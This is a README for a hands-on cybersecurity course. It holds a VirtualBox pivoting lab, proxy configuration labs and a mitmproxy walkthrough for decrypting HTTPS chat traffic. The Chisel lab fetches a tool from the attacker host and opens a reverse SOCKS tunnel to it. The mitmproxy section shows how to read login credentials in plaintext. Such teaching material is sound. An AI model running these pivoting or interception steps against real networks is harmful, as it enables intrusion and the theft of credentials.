# cyberGoat
cyberGoat — a hands-on, instructor-ready cybersecurity course repo with 10 practical modules (networking, web pentesting, cloud, Active Directory, Kubernetes, malware analysis, SOC ops). Includes step-by-step labs, Docker/Vagrant setups, tool install scripts, exploit walkthroughs, and student/instructor templates for safe classroom labs..



# CyberGoat — Advanced Cybersecurity Labs & Training Repository

<p align="center">
  <img src="https://github.com/shaaiir/cyberGoat/blob/main/cybergoat1.png" width="320" style="border-radius:12px; display:block; margin:0 auto 12px;" />
</p>
<p align="center">
<img src="https://github.com/shaaiir/cyberGoat/blob/main/cybergoat2.png" width="320" style="border-radius:12px; display:block; margin:0 auto;" />
</p>
---

### About CyberGoat
**CyberGoat** is a complete, practical cybersecurity training repository featuring 10 hands-on modules — covering networking, web app pentesting, cloud security, Active Directory attacks, Kubernetes, malware analysis, SOC operations, and more.  
Each module includes detailed labs, Docker/Vagrant setups, tools, exploit demos, and instructor/student templates for structured learning.

---

### 🧩 Modules Overview
1. Core Foundations  
2. Proxy, Reverse Proxy & Forward Proxy  
3. Cloud Pentesting (AWS, Azure, GCP)  
4. Pivoting, Tunneling, Proxying  
5. Active Directory & Internal Exploitation  
6. Kubernetes & Container Security  
7. Social Engineering  
8. Malware Analysis & Reverse Engineering  
9. Blue Team, SOC & Splunk  
10. Web Application Penetration Testing 

---

### 💡 Vision
Empower students and professionals to **learn cybersecurity by doing** — through reproducible, legal, and realistic lab environments.

---

> 🧑‍💻 Built and maintained by **Shahir Ali**  
> 🌐 [GitHub Profile](https://github.com/shaaiir)






Objective: Build a strong practical foundation in networking, operating systems, and offensive methodology. By the end of this module students will be able to: understand and manipulate TCP/IP and OSI layers, perform subnetting and VLAN analysis, enumerate and exploit OS weaknesses, perform post-exploitation, and follow a structured pentesting methodology mapped to MITRE ATT&CK and the Cyber Kill Chain.



# Module 01 — Core Foundations: Pivoting Lab Setup

## Objective
Build a **strong practical foundation** in networking, operating systems, and offensive methodology. By the end of this module, students will be able to:

- Understand and manipulate **TCP/IP and OSI layers**.
- Perform **subnetting and VLAN analysis**.
- Enumerate and exploit **operating system weaknesses**.
- Conduct **post-exploitation** and **pivoting** using tunneling tools like **Chisel**.
- Follow a structured **penetration testing methodology** mapped to **MITRE ATT&CK** and the **Cyber Kill Chain**.

***

## Lab Overview: Network Pivoting with Chisel
You’ll build a **multi-network lab environment** using **VirtualBox** to simulate network isolation and penetration testing scenarios.

### Machines Setup
| Role | OS | Purpose |
|------|----|----------|
| Attacker | Kali Linux | Primary attack and control machine |
| Pivot | Ubuntu Linux | Dual-homed host bridging two NAT networks |
| Internal Linux Host | Debian/Ubuntu | Target in internal subnet |
| Internal Windows Host | Windows 10 | Target in internal subnet |

***

## Step 1 — VirtualBox Network Configuration
1. **Create two NAT Networks**:
   - **NATNetwork1:** `10.0.10.0/24` — attacker and pivot connected here.
   - **NATNetwork2:** `10.0.20.0/24` — pivot, internal Linux, and Windows hosts connected here.

2. **Configure adapters:**
   - **Kali:** Single adapter → NATNetwork1.
   - **Pivot (Ubuntu):** Two adapters → NATNetwork1 and NATNetwork2 (dual NIC).
   - **Linux target:** Single adapter → NATNetwork2.
   - **Windows target:** Single adapter → NATNetwork2.

👉 Verify connectivity with `ping`:
- Kali ↔ Pivot ✅
- Pivot ↔ Internal hosts ✅
- Kali ↔ Internal hosts ❌ (blocked — will pivot later)

***

## Step 2 — Configure the Kali Attacker Machine

1. **Install tools:**
   ```bash
   sudo apt update && sudo apt install chisel proxychains4 -y
   ```

2. **Edit proxychains configuration:**
   ```bash
   sudo nano /etc/proxychains4.conf
   ```
   Add at the bottom:
   ```
socks5  127.0.0.1 1080
   ```

3. Start listening for reverse traffic:
   ```bash
   ./chisel server -p 8080 --reverse
   ```

   This will allow reverse connections from the pivot host.

***

## Step 3 — Upload and Run Chisel on Pivot Host (Ubuntu)

1. **Transfer Chisel:**
   Use a simple Python HTTP server on Kali:
   ```bash
   python3 -m http.server 8000
   ```
   Then on the pivot:
   ```bash
   wget http://<kali_ip>:8000/chisel
   chmod +x chisel
   ```

2. **Run Chisel Client (Reverse Connection):**
   ```bash
   ./chisel client <kali_ip>:8080 R:socks
   ```
   This creates a SOCKS proxy from pivot → attacker.

***

## Step 4 — Verify Proxy and Pivot Access

1. **Check connectivity** from Kali through proxychains:
   ```bash
   proxychains nmap -sT 10.0.20.0/24
   ```
   You should see open ports of the internal Linux and Windows machines.

2. Your traffic is now tunneled through the Pivot host using Chisel.

***

## Step 5 — Advanced: Double Pivot (Optional)

To demonstrate **deep network traversal**, you can add another internal machine on a third subnet and chain Chisel tunnels, as described in HTB’s double pivot guide. This allows multi-hop access similar to real enterprise environments.

***

## Step 6 — Post-Exploitation Workflow

Use this setup to practice:
- **Enumerating internal networks** with tools like `nmap` and `smbclient`.
- **Credential dumping** and **lateral movement** simulations.
- Applying **MITRE ATT&CK stages**, from Initial Access to Execution and Persistence.

***

## Step 7 — Reflection & Documentation

Document:
- Network map diagrams.
- Chisel commands used.
- Verification results (connectivity tests, successful scans).
- Lessons learned about traffic tunneling and segmentation.

***

### Summary
After completing this module, you’ll understand:
- How to configure and isolate virtual networks.
- The purpose and power of network pivoting.
- How tools like **Chisel** enable controlled tunneling and SOCKS proxy access.
- How pivoting integrates into the **post-exploitation** stage of a penetration test.

If you tell me whether this module is for your **personal lab** or **structured training curriculum**, I can tailor the terminology, exercises, and difficulty level accordingly.

[1](https://forum.hackthebox.com/t/attacking-enterprise-networks-double-pivot-using-chisel/267043)
[2](https://www.bokehsolutions.com/component/content/article/network-pivoting-with-chisel.html?catid=12&Itemid=101)
[3](https://www.youtube.com/watch?v=pbR_BNSOaMk)
[4](https://www.dedoimedo.com/computers/virtualbox-nat-networks.html)
[5](https://www.youtube.com/watch?v=pBG4xSpUTlc)
[6](https://www.hackingarticles.in/chisel-port-forwarding-a-detailed-guide/)
[7](https://www.youtube.com/watch?v=hBXFJP6YDgY)


# Module 2 — Proxies: Forward Proxy, Reverse Proxy, Transparent Proxy

> **Purpose:** A practical module for learning, deploying, and testing proxy types used in networking and web infrastructure. Includes conceptual explanations, diagrams, hands-on labs, example configs, Dockerized lab setups, assessments, and a suggested Git repository structure.

---

## Table of Contents

1. Overview & Learning Objectives
2. Prerequisites
3. Key Concepts & Terminology
4. Proxy Types

   * Forward Proxy
   * Reverse Proxy
   * Transparent Proxy
   * Distinction & Comparison
5. Architecture Diagrams (ASCII + explanation)
6. Hands-on Labs

   * Lab A: Simple Node.js Forward Proxy
   * Lab B: Squid Forward Proxy (Docker)
   * Lab C: Nginx Reverse Proxy + Upstream App (Docker Compose)
   * Lab D: TLS termination & Let's Encrypt (Reverse Proxy)
   * Lab E: Caching behavior & headers testing
7. Example Configurations

   * `nginx` reverse proxy snippets
   * `squid` forward proxy snippets
   * `docker-compose.yml` for a complete lab
8. Testing & Validation (curl examples, browser tips)
9. Security Considerations
10. Troubleshooting Checklist
11. Assessment: Exercise & Quiz
12. Git Repository Structure
13. How to submit / mark as complete

---

## 1. Overview & Learning Objectives

By the end of this module you will be able to:

* Explain the difference between forward proxies and reverse proxies.
* Deploy and configure a basic forward proxy (Node.js and Squid).
* Configure an Nginx reverse proxy with multiple upstreams, load balancing, and TLS termination.
* Understand common headers (X-Forwarded-For, X-Real-IP, Via, Forwarded) and how proxies modify them.
* Evaluate caching implications and proxy security controls.
* Use Docker Compose to stand up repeatable labs.

## 2. Prerequisites

* Basic Linux command-line skills (ssh, curl, grep).
* Docker & Docker Compose installed (labs use containers).
* Basic understanding of HTTP and TLS.

## 3. Key Concepts & Terminology

* **Client:** The originator of requests (browser, curl).
* **Origin / Upstream:** The server that has the content or application.
* **Proxy:** An intermediary that forwards requests between client and server, and may inspect, filter, cache, or modify traffic.
* **Forward Proxy:** Client-configured proxy used to reach arbitrary external servers on behalf of clients.
* **Reverse Proxy:** Server-side proxy placed in front of one or more origin servers; clients think they talk to the origin but talk to the proxy.
* **Transparent Proxy:** Intercepts traffic without client configuration (commonly done using network routing/iptables).
* **TLS Termination:** Proxy handles TLS (HTTPS) and forwards plain HTTP to upstream.

## 4. Proxy Types

### Forward Proxy

* Acts on behalf of clients. Typical uses: access control, rate limiting, anonymization, caching, content filtering.
* Clients must be configured (browser proxy, environment variables) unless a transparent forward proxy is used.

### Reverse Proxy

* Acts on behalf of one or more servers. Typical uses: load balancing, TLS termination, caching, WAF integration, path-based routing.
* Common products: Nginx, HAProxy, Traefik, Apache httpd, F5.

### Transparent Proxy

* Intercepts traffic without client awareness. Often used in enterprise networks for content filtering or caching.
* Requires network-level manipulation (routing, NAT, firewall rules).

### Comparison (short table)

| Feature           |                        Forward Proxy |                   Reverse Proxy |
| ----------------- | -----------------------------------: | ------------------------------: |
| Configured by     |                               Client |            Server/Network admin |
| Primary use       | Client privacy / filtering / caching | Load balancing / TLS / security |
| Visible to client |                        Yes (usually) |       No (client thinks origin) |

## 5. Architecture Diagrams

### Forward Proxy (simple)

Client -> Forward Proxy -> Internet (Origin)

### Reverse Proxy (simple)

Client -> Reverse Proxy -> Upstream App A
-> Upstream App B

(Reverse proxy terminates TLS, does path-based routing, or load balancing.)

## 6. Hands-on Labs

> Each lab folder contains `README.md`, `Dockerfile` (if needed), and `test.sh` to run basic checks.

### Lab A — Minimal Node.js Forward Proxy

**Purpose:** Implement a very small HTTP forward proxy to learn request/response flow and headers.

**Files:** `labs/forward-proxy/node-proxy/index.js`

```js
// index.js — simple forward proxy (educational only, not production)
const http = require('http');
const net = require('net');
const url = require('url');

const server = http.createServer((req, res) => {
  const target = url.parse(req.url);
  const options = {
    hostname: target.hostname,
    port: target.port || 80,
    path: target.path,
    method: req.method,
    headers: req.headers
  };

  const proxyReq = http.request(options, proxyRes => {
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res, { end: true });
  });

  req.pipe(proxyReq, { end: true });
});

server.on('connect', (req, clientSocket, head) => {
  // handle HTTPS CONNECT tunnels
  const { port, hostname } = new URL(`http://${req.url}`);
  const serverSocket = net.connect(port || 443, hostname, () => {
    clientSocket.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    serverSocket.write(head);
    serverSocket.pipe(clientSocket);
    clientSocket.pipe(serverSocket);
  });
});

server.listen(3128, () => console.log('Forward proxy listening on 3128'));
```

**How to test:**

* Start: `node index.js`
* Use curl: `curl -x http://localhost:3128 http://example.com` (HTTP)
* For HTTPS: `curl -x http://localhost:3128 https://example.com` (CONNECT tunneling)

**Learning notes:**

* This proxy forwards headers as-is; clients' `Host`, `User-Agent` etc. will be seen by upstream.
* Production proxies need ACLs, auth, rate-limits, TLS interception (if required), and logging.

### Lab B — Squid Forward Proxy (Docker)

**Purpose:** Use Squid for a realistic forward proxy with ACLs and caching.

**Files:** `labs/forward-proxy/squid/` contains `Dockerfile`, `squid.conf`, `docker-compose.yml` and `README.md`.

**Key `squid.conf` points:**

* `http_port 3128` — listen port
* Access control lists for allowed networks
* cache_dir settings

**Quick start:** `docker-compose up -d` then configure browser/system to use `localhost:3128` as HTTP/HTTPS proxy.

### Lab C — Nginx Reverse Proxy + App (Docker Compose)

**Purpose:** Deploy an Nginx reverse proxy that routes `/app1` to App1 and `/app2` to App2, with load balancing.

**Files:** `labs/reverse-proxy/nginx/` and `labs/reverse-proxy/apps/` — includes sample Node apps.

**Sample `nginx.conf` snippet:**

```nginx
http {
  upstream app_pool {
    server app1:3000;
    server app2:3000;
  }

  server {
    listen 80;
    server_name proxy.local;

    location / {
      proxy_pass http://app_pool;
      proxy_set_header Host $host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
    }

    location /app1/ {
      proxy_pass http://app1:3000/;
    }
  }
}
```

**Docker Compose:** provides `nginx`, `app1`, `app2`. Add `extra_hosts` mapping `proxy.local` to `127.0.0.1` for local testing.

**Test:** `curl http://localhost:8080/` -> proxy should distribute to upstreams.

### Lab D — TLS termination & Let's Encrypt (Reverse Proxy)

**Purpose:** Configure TLS termination at the reverse proxy using Certbot or an automated proxy (Traefik) for certificate management.

**Notes:**

* For local development, use self-signed certs and add to OS trust.
* For public-facing endpoints, use Let's Encrypt with either Certbot or a proxy that supports ACME (Traefik, Caddy).

### Lab E — Caching behavior & headers testing

**Tasks:**

* Configure `proxy_cache_path` and `proxy_cache` in Nginx.
* Request resource repeatedly while varying `Cache-Control` headers and observe hits/misses with `X-Cache-Status` header.

## 7. Example Configurations

### Nginx — Reverse Proxy basic

```nginx
server {
  listen 80;
  server_name example.com;

  location / {
    proxy_pass http://backend:8080;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }
}
```

### Squid — Minimal `squid.conf` (example)

```
http_port 3128
acl localnet src 10.0.0.0/8    # adjust
http_access allow localnet
http_access deny all
cache_dir ufs /var/spool/squid 100 16 256
access_log /var/log/squid/access.log
```

### Docker Compose (Reverse Proxy + 2 apps)

```yaml
version: '3.8'
services:
  nginx:
    image: nginx:stable
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
    ports:
      - '8080:80'
    depends_on:
      - app1
      - app2

  app1:
    build: ./apps/app1
    ports:
      - '3001:3000'

  app2:
    build: ./apps/app2
    ports:
      - '3002:3000'
```

## 8. Testing & Validation

**Useful curl commands**

* Test forward proxy (HTTP):
  `curl -v -x http://localhost:3128 http://example.com/`

* Test reverse proxy (path routing):
  `curl -v http://localhost:8080/app1/`

* Check X-Forwarded-For:
  `curl -H 'X-Forwarded-For: 1.2.3.4' http://localhost:8080/` (observe logs)

* HTTPS (CONNECT via curl):
  `curl -v --proxy http://localhost:3128 https://example.com/`

## 9. Security Considerations

* **Authentication:** Implement proxy auth for forward proxies (Basic, Digest, or OAuth-based). Squid supports auth helpers.
* **ACLs:** Limit which clients can use the forward proxy to avoid open proxy abuse.
* **Header hygiene:** Don’t blindly trust `X-Forwarded-For`; validate/log real client IP when possible (use mutual TLS or secure network paths).
* **TLS:** Terminate TLS at reverse proxy when necessary but consider end-to-end TLS if confidentiality must be preserved.
* **Rate limiting & WAF:** Use proxy features or front with WAF to mitigate abusive traffic.
* **Logging & privacy:** Ensure logs are stored securely and PII is masked if policy requires.

## 10. Troubleshooting Checklist

* Is the proxy listening on the expected port? `ss -tuln | grep 3128`
* Are firewall rules blocking traffic? Check `iptables` / `ufw`.
* For reverse proxy: is `proxy_pass` URL reachable from the proxy container? `docker exec -it nginx curl http://app1:3000/`
* Check headers — `Host`, `X-Forwarded-For`, `X-Real-IP` — are they set correctly?
* If HTTPS failing: inspect cert chain with `openssl s_client -connect host:443 -servername host`.

## 11. Assessment: Exercises & Quiz

**Practical tasks**

1. Deploy the Docker Compose reverse proxy lab and demonstrate path-based routing to two apps.
2. Run the Node.js forward proxy and fetch a site via the proxy (show headers).
3. Configure Squid to allow only a specific client IP and to log cache hits. Show evidence.

**Quiz (short)**

* Q1: What header typically carries client IPs through a reverse proxy? (Answer: `X-Forwarded-For`)
* Q2: What is an open forward proxy and why is it dangerous? (Answer: a proxy that accepts requests from any client on the Internet — can be abused for anonymized attacks)
* Q3: Does a reverse proxy require client configuration? (Answer: No)

## 12. Git Repository Structure

Suggested structure to commit to Git (recommended `module-2-proxies` repo):

```
module-2-proxies/
├── README.md                   # module overview (this file)
├── docs/
│   ├── slides.pdf
│   └── cheatsheet.md
├── labs/
│   ├── forward-proxy/
│   │   ├── node-proxy/
│   │   │   ├── index.js
│   │   │   └── README.md
│   │   └── squid/
│   │       ├── Dockerfile
│   │       ├── squid.conf
│   │       └── docker-compose.yml
│   └── reverse-proxy/
│       ├── nginx/
│       │   ├── nginx.conf
│       │   └── Dockerfile (if custom)
│       ├── apps/
│       │   ├── app1/
│       │   │   └── server.js
│       │   └── app2/
│       └── docker-compose.yml
├── examples/
│   ├── nginx-sample.conf
│   └── squid-sample.conf
├── tests/
│   └── run_tests.sh
└── license.txt
```

**Commit guidance:** Make each lab a separate commit with descriptive history (e.g., `labs: add nginx reverse-proxy compose + sample apps`). Use branches for features: `feature/nginx-tls`, `feature/squid-auth`.

## 13. How to submit / mark as complete

* Add a `COMPLETED.md` in the lab folder with commands you ran, outputs, and screenshots where relevant.
* Create PR to `main` with lab solutions; include `test.sh` to automatically validate basic behavior.

---

### Appendix A — Quick reference: Useful commands

* `curl -v -x http://proxy:3128 http://example.com/`
* `docker-compose up --build -d`
* `docker logs -f <container>`
* `ss -tuln | grep 80`

---
# Intercepting and Reading SSL Chat Traffic with mitmproxy (Demo)

> **Warning / Legal:** This guide is for educational and authorized testing only. Do **not** intercept traffic that you do not have explicit permission to inspect. Using mitmproxy or similar tools on networks or applications without authorization may be illegal.

This document describes how to set up **mitmproxy** and demonstrate HTTPS interception for a local demo chat application exposed via **ngrok**, showing step-by-step how to view login credentials and chat messages in plaintext.

---

## Prerequisites

- **Python 3.10+** and `pip` installed  
- Your chat app running locally (e.g. `python run.py`) and accessible at `http://127.0.0.1:5000` or `http://localhost:5000`  
- **ngrok** installed (Homebrew: `brew install ngrok` or download from ngrok.com)  
- **mitmproxy** installed (`pip install mitmproxy` or `brew install mitmproxy`)  
- Recommended browser: **Firefox** or **Chrome**

---

## Overview / High-level flow

1. Run your chat app locally over **HTTP** (easiest)  
2. Expose the app publicly via **ngrok**  
3. Run **mitmproxy** locally (default proxy port `8080`)  
4. Configure your browser to use mitmproxy as an HTTP/HTTPS proxy  
5. Visit the ngrok URL in the proxied browser and interact with the chat app  
6. Inspect decrypted traffic (HTTP, HTTPS, WebSocket) in mitmproxy UI

---

## Step 1 — Start your chat app (HTTP mode recommended)

If your app supports running in HTTP mode, do that for simpler testing with ngrok:

```bash
# from your project directory
python run.py   # or: python run_http.py


# ensure the app listens on http://127.0.0.1:5000 or http://localhost:5000
If your app only runs HTTPS with self-signed certs, you can still proceed but will need to install mitmproxy's CA in the browser (see Step 6).



Step 2 — Expose the app publicly with ngrok
Open a new terminal:
ngrok http 5000
ngrok will print a public forwarding URL like https://abcd-1234-fgngrok-free.app. Copy that https URL and keep ngrok running.
Keep ngrok running while you test — it forwards public requests to your local server.




Step 3 — Run mitmproxy
Open another terminal and start mitmproxy on default port 8080:
mitmproxy
This launches the interactive mitmproxy UI (terminal-based). mitmproxy listens on 127.0.0.1:8080 by default and will display intercepted flows.



Step 4 — Configure your browser to use mitmproxy
Set your browser to use a manual proxy for both HTTP and HTTPS:
Address: 127.0.0.1
Port: 8080
Firefox: Settings → Network Settings → Manual proxy configuration
Chrome: Chrome uses system proxy settings (set via OS network settings or a proxy extension).
If you use Chrome and don't want to change global proxy settings, you can run a separate browser profile or use Firefox for testing.



Step 5 — Visit your chat app via ngrok
In the proxied browser, open the ngrok URL you copied earlier (e.g. https://abcd-1234-fgngrok-free.app).
Log in, register, and send messages as usual.
mitmproxy will capture requests and responses (including WebSocket frames used for chat).



Step 6 — (Optional) Trust mitmproxy's CA for full TLS interception
When intercepting HTTPS, the browser will warn about mitmproxy's certificate. For a clean intercept experience, install the mitmproxy CA:
With mitmproxy running and your browser proxied, open: http://mitm.it
Download the appropriate CA certificate for your browser / OS
Follow installation instructions for your platform (Firefox has its own certificate store; macOS uses Keychain)
Once installed & trusted, mitmproxy can fully decrypt HTTPS traffic without browser warnings
For local testing only. Installing a CA permanently alters trust on the system — remove it after testing if needed.



Step 7 — Intercept and read traffic in mitmproxy
In the mitmproxy terminal UI:
Each HTTP/HTTPS/WebSocket request is shown as a flow (one line)
Use arrow keys to select a flow and press Enter to view details
Tabs in the flow view show:
Request — headers and body (e.g., login POST with credentials)
Response — server replies
WebSocket — inspect real-time chat frames (JSON payloads are shown in plaintext)
Example WebSocket/chat payloads you might see:
["send_message",{"receiver_id":2,"message":"hi who are you"}]
["receive_message",{"message_id":30,"sender":"shahir","content":"hi who are you"}]
This demonstrates that, once intercepted and decrypted, chat messages and login credentials can be observed in plaintext.




Step 8 — Document & demonstrate
Capture screenshots of mitmproxy showing:
Decrypted login POST with credentials
WebSocket frames showing chat content
Any useful headers like Authorization, Cookie, X-Forwarded-For, etc.
Explain that this is a demonstration of how a man-in-the-middle with a trusted or forced CA can read encrypted traffic.
Troubleshooting
ngrok ERR_NGROK_3004: Make sure your local app is actually running on the port you supplied to ngrok (5000), and that you used ngrok http 5000.
No flows in mitmproxy: Verify browser proxy settings; restart the browser after changing proxy settings; confirm mitmproxy is listening on 127.0.0.1:8080.
TLS errors / browser still warns: Install the mitmproxy CA (http://mitm.it) or use HTTP for testing.
Not seeing localhost traffic: Modern browsers sometimes bypass proxies for localhost — using ngrok (public URL) avoids that bypass.
WebSocket traffic not visible: Ensure mitmproxy is running before opening the page; recreate the connection if necessary.
Security & Ethics Note (important)
This method demonstrates the risks where a client or environment trusts a CA that intercepts traffic, or when organizational devices enforce TLS inspection. MitM interception is powerful and intrusive — only use on systems and applications for which you have explicit authorization (your own test apps, pentest engagements with written permission, or lab environments). Unauthorized interception is illegal and unethical.





Quick commands reference
# start chat app (example)
python run.py

# expose local port 5000 to the internet with ngrok
ngrok http 5000

# start mitmproxy
mitmproxy

# visit http://mitm.it in proxied browser to install the CA
Cleanup after testing
Remove mitmproxy CA from your browser / OS trust store if you no longer need it.
Stop mitmproxy and ngrok.
Revert any global proxy settings in your browser or OS.
